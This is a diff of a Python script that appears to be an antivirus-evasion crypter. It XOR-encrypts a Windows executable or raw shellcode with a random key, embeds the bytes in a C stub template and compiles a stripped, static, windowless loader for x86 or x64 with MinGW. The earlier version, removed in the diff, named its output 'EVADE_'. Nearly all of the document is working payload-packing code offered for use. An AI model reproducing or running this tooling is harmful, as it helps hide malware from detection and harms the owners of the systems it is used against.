@@ -1,122 +1,103 @@
-# main.py
-
-import lief
-from capstone import Cs, CS_ARCH_X86, CS_MODE_32
-import os
-import sys
+#!/usr/bin/env python3
+import sys, random, subprocess
 from pathlib import Path
 
-def xor_encode_shellcode(shellcode_bytes, key=0xAA):
-    return bytes(b ^ key for b in shellcode_bytes), key
+import lief
 
+def random_key() -> int:
+    return random.randrange(1, 0x100)
 
-def extract_text_section(exe_path):
-    binary = lief.parse(exe_path)
-    text_section = binary.get_section(".text")
-    return text_section.content, text_section.virtual_address
+def xor_bytes(data: bytes, key: int) -> bytes:
+    return bytes(b ^ key for b in data)
 
-def disassemble_code(code_bytes, base_addr):
-    md = Cs(CS_ARCH_X86, CS_MODE_32)
-    md.detail = True
-    return list(md.disasm(bytes(code_bytes), base_addr))
+def to_c_array(data: bytes) -> str:
+    # returns "0x12,0x34,0x56,…"
+    return ','.join(f'0x{b:02x}' for b in data)
 
-def basic_obfuscation(instructions):
-    obfuscated = []
-    for ins in instructions:
-        obfuscated.append(ins)
-        if ins.mnemonic not in ['nop', 'ret']:
-            # Append a fake NOP entry as a tuple
-            fake_nop = (ins.address + 1, 'nop', '')
-            obfuscated.append(fake_nop)
-    return obfuscated
+def load_stub() -> str:
+    return Path('stub.c').read_text()
 
+def compile_stub(code: str, out_exe: Path, compiler: str, shellcode_mode: bool):
+    tmp_c = Path('filled_stub.c')
+    tmp_c.write_text(code)
 
-def write_disassembly(instructions, out_path):
-    with open(out_path, "w") as f:
-        for ins in instructions:
-            if isinstance(ins, tuple):
-                f.write(f"0x{ins[0]:x}:\t{ins[1]}\t{ins[2]}\n")
-            else:
-                f.write(f"0x{ins.address:x}:\t{ins.mnemonic}\t{ins.op_str}\n")
-
-
-def write_text_section(code_bytes, out_path):
-    with open(out_path, "wb") as f:
-        f.write(bytearray(code_bytes))
-
-def make_output_dir(base_path):
-    output_dir = Path("artifacts") / Path(base_path).stem
-    output_dir.mkdir(parents=True, exist_ok=True)
-    return output_dir
-
-import subprocess
-
-def build_new_exe(shellcode_path, output_exe_path):
-    print("[*] Building new .exe with XOR-encoded shellcode...")
-
-    with open("stub_template.c", "r") as f:
-        template = f.read()
-
-    with open(shellcode_path, "rb") as f:
-        shellcode_bytes = f.read()
-
-    encoded_shellcode, key = xor_encode_shellcode(shellcode_bytes)
-
-    shellcode_c = ','.join(f'0x{b:02x}' for b in encoded_shellcode)
-    decoder_stub = f"""
-    for (int i = 0; i < sizeof(shellcode); i++) {{
-        shellcode[i] ^= 0x{key:02x};
-    }}
-    """
-
-    stub_code = template.replace("SHELLCODE_PLACEHOLDER", f"{{{shellcode_c}}}")
-    stub_code = stub_code.replace("// DECODE_STUB", decoder_stub)
-
-    stub_file = "loader.c"
-    with open(stub_file, "w") as f:
-        f.write(stub_code)
-
-    compile_cmd = [
-        "i686-w64-mingw32-gcc",
-        stub_file,
-        "-o", output_exe_path,
-        "-fno-stack-protector",
-        "-mwindows"
+    cmd = [compiler]
+    if shellcode_mode:
+        cmd.append('-DSHELLCODE_MODE')
+    cmd += [
+        str(tmp_c),
+        '-o', str(out_exe),
+        '-O2', '-s',
+        '-static',
+        '-Wl,--subsystem,windows'
     ]
 
-    print(f"[*] Compiling: {' '.join(compile_cmd)}")
-    subprocess.run(compile_cmd, check=True)
-    print(f"[+] Built: {output_exe_path}")
+    print(f"[*] Compiling: {' '.join(cmd)}")
+    subprocess.run(cmd, check=True)
+    print(f"[+] Built: {out_exe}")
 
+def obf_exe(path: Path):
+    data = path.read_bytes()
+    key  = random_key()
+    enc  = xor_bytes(data, key)
+    print(f"[*] XOR key = 0x{key:02x}")
 
+    # Detect x86 vs x64
+    pe      = lief.PE.parse(str(path))
+    machine = pe.header.machine
+    if   machine == lief.PE.Header.MACHINE_TYPES.AMD64:
+        compiler, arch_s = 'x86_64-w64-mingw32-gcc', 'x64'
+    elif machine == lief.PE.Header.MACHINE_TYPES.I386:
+        compiler, arch_s = 'i686-w64-mingw32-gcc', 'x86'
+    else:
+        sys.exit(f"[!] Unsupported PE machine: {machine}")
+
+    print(f"[*] Detected {arch_s} EXE → using {compiler}")
+
+    stub     = load_stub()
+    bytestr  = to_c_array(enc)
+    # HERE we inject only the comma-list; braces are in stub.c
+    filled   = stub.replace('PAYLOAD_BYTES', bytestr)\
+                   .replace('PAYLOAD_KEY',    str(key))
+
+    out_dir = Path('artifacts') / path.stem
+    out_dir.mkdir(parents=True, exist_ok=True)
+    out_exe  = out_dir / f"obf_{path.name}"
+
+    compile_stub(filled, out_exe, compiler, shellcode_mode=False)
+
+def obf_shellcode(path: Path):
+    raw = path.read_bytes()
+    print(f"[*] Embedding {len(raw)} bytes of shellcode")
+
+    stub    = load_stub()
+    bytestr = to_c_array(raw)
+    filled  = stub.replace('PAYLOAD_BYTES', bytestr)
+
+    arch = ''
+    while arch not in ('x86','x64'):
+        arch = input("Architecture (x86/x64): ").strip().lower()
+    compiler = 'x86_64-w64-mingw32-gcc' if arch=='x64' else 'i686-w64-mingw32-gcc'
+
+    out_dir = Path('artifacts') / path.stem
+    out_dir.mkdir(parents=True, exist_ok=True)
+    out_exe  = out_dir / f"obf_{path.stem}_{arch}.exe"
+
+    compile_stub(filled, out_exe, compiler, shellcode_mode=True)
 
 def main():
     if len(sys.argv) != 2:
-        print("Usage: python main.py <path_to_exe>")
+        print(f"Usage: {sys.argv[0]} <payload-file>")
         sys.exit(1)
 
-    exe_path = sys.argv[1]
-    output_dir = make_output_dir(exe_path)
+    payload = Path(sys.argv[1])
+    if not payload.exists():
+        sys.exit(f"[!] File not found: {payload}")
 
-    code_bytes, base_addr = extract_text_section(exe_path)
-    disassembled = disassemble_code(code_bytes, base_addr)
-    obfuscated = basic_obfuscation(disassembled)
+    if payload.suffix.lower() == '.exe':
+        obf_exe(payload)
+    else:
+        obf_shellcode(payload)
 
-    disasm_path = output_dir / "obfuscated_disassembly.txt"
-    raw_shellcode_path = output_dir / "text_section.bin"
-    output_exe = output_dir / f"EVADE_{Path(exe_path).name}"
-
-    # ✅ Write artifacts BEFORE building
-    write_disassembly(obfuscated, disasm_path)
-    write_text_section(code_bytes, raw_shellcode_path)
-
-    # ✅ Then build the final obfuscated exe
-    build_new_exe(raw_shellcode_path, str(output_exe))
-
-    print(f"[+] Output saved in: {output_dir}")
-    print(f"    - Disassembly: {disasm_path}")
-    print(f"    - Raw Shellcode: {raw_shellcode_path}")
-    print(f"    - Final EXE: {output_exe}")
-
-if __name__ == "__main__":
+if __name__ == '__main__':
     main()
